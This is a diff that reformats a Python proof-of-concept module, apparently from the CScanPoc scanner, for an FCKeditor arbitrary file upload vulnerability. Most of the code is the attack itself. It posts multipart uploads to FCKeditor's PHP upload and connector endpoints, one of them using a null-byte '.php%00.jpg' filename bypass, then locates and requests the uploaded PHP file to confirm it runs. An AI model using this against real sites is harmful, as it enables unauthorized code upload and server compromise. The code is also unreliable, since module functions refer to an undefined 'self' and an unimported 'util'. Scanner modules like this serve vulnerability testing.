@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FCKeditor_0002' # 平台漏洞编号，留空
+    vuln_id = 'FCKeditor_0002'  # 平台漏洞编号，留空
     name = 'FCKeditor 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         FCKeditor 2.6版本, upload.asp文件为黑名单过滤, 可绕过上传。
@@ -19,9 +20,12 @@ class Vuln(ABVuln):
     product = 'FCKeditor'  # 漏洞应用名称
     product_version = '2.6版本'  # 漏洞应用版本
 
+
 '''
 fckeditor版本 <= 2.4.3
 '''
+
+
 def fck2_4_3(host):
     hh = hackhttp.hackhttp()
     path = "/fckeditor2.6/editor/filemanager/upload/php/upload.php?Type=Media"
@@ -32,22 +36,26 @@ def fck2_4_3(host):
     data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
     head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
     url = host + path
-    code, head, body, ecode, redirect_url = hh.http(url, headers=head, data=data)
+    code, head, body, ecode, redirect_url = hh.http(
+        url, headers=head, data=data)
     if code == 200:
         shell = re.findall("eted\(\d+,\"(.+?.php)\"", body)
         if shell:
             phpurl = util.urljoin(host, '../'+shell[0])
             code, head, body, ecode, redirect_url = hh.http(phpurl)
-            if code==200 and '35fd19fbe470f0cb5581884fa700610f' in body:
+            if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
                 #security_hole('upload vulnerable:%s' % phpurl)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
-            #else:
+                    target=self.target, name=self.vuln.name))
+            # else:
                 #security_info('maybe vulnerable:%s' % phpurl)
+
 
 '''
 fckeditor 版本 介于2.4.3与2.6.4之间（不包括2.4.3）
 '''
+
+
 def fck2_6_4(host):
     hh = hackhttp.hackhttp()
     path = "/fckeditor2.6/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=ssdlh.php%00.jpg"
@@ -58,17 +66,18 @@ def fck2_6_4(host):
     data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
     head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
     url = host + path
-    code, head, body, ecode, redirect_url = hh.http(url, headers=head, data=data)
+    code, head, body, ecode, redirect_url = hh.http(
+        url, headers=head, data=data)
     if code == 200:
         shell = re.findall("eted\(\d+,\"(.+?\.php)", body)
         if shell:
             phpurl = util.urljoin(host, '../'+shell[0])
             code, head, body, ecode, redirect_url = hh.http(phpurl)
-            if code==200 and '35fd19fbe470f0cb5581884fa700610f' in body:
+            if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
                 #security_hole('upload vulnerable:%s' % phpurl)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
-            #else:
+                    target=self.target, name=self.vuln.name))
+            # else:
                 #security_info('maybe vulnerable:%s' % phpurl)
 
 
@@ -84,15 +93,16 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             fck2_4_3(self.target)
             fck2_6_4(self.target)
-                    
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
